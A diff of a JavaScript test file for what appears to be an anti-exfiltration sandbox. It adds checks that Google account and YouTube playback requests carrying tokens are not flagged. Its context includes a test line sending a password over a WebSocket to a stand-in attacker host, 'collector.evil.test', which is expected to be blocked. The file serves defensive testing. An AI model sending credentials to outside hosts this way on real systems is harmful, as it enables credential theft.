@@ -218,6 +218,34 @@ function makeHarness(options) {
   );
   assert.strictEqual(frame.state.emits.at(-1).type, 'blocked_token_exfil');
 
+  /* Google keeps the browser session, account UI and video delivery on separate
+     service domains. These calls are made by child frames and legitimately carry
+     opaque account/playback values. Rejecting either makes a live YouTube tab lose
+     account state or playback even though reloading finds the untouched cookies. */
+  const googleAccountFrame = makeHarness({
+    href: 'https://accounts.google.com/gsi/iframe/select',
+    ancestorOrigins: ['https://www.youtube.com'],
+  });
+  await googleAccountFrame.sandbox.fetch('https://www.youtube.com/youtubei/v1/account/accounts_list', {
+    body: 'access_token=abcdefghijklmnopqrstuvwxyz1234567890abcd',
+  });
+  assert.strictEqual(googleAccountFrame.state.fetches.length, 1,
+    'a Google identity frame may refresh account state back to YouTube');
+  assert.strictEqual(googleAccountFrame.state.emits.length, 0,
+    'the legitimate account refresh is not reported as token exfiltration');
+
+  const youtubePlayerFrame = makeHarness({
+    href: 'https://www.youtube.com/embed/example',
+    ancestorOrigins: ['https://www.youtube.com'],
+  });
+  await youtubePlayerFrame.sandbox.fetch(
+    'https://r1---sn-a5mekn6k.googlevideo.com/videoplayback?cpn=abcdefghijklmnopqrstuvwxyz1234567890abcd',
+  );
+  assert.strictEqual(youtubePlayerFrame.state.fetches.length, 1,
+    'a YouTube child frame may send opaque playback state to Google video delivery');
+  assert.strictEqual(youtubePlayerFrame.state.emits.length, 0,
+    'the legitimate playback request is not reported as token exfiltration');
+
   const ws = new frame.sandbox.WebSocket('wss://collector.evil.test/socket');
   ws.send('password=correct horse battery staple');
   assert.strictEqual(frame.state.websocketSends.length, 0, 'off-site WebSocket credential sends are blocked');
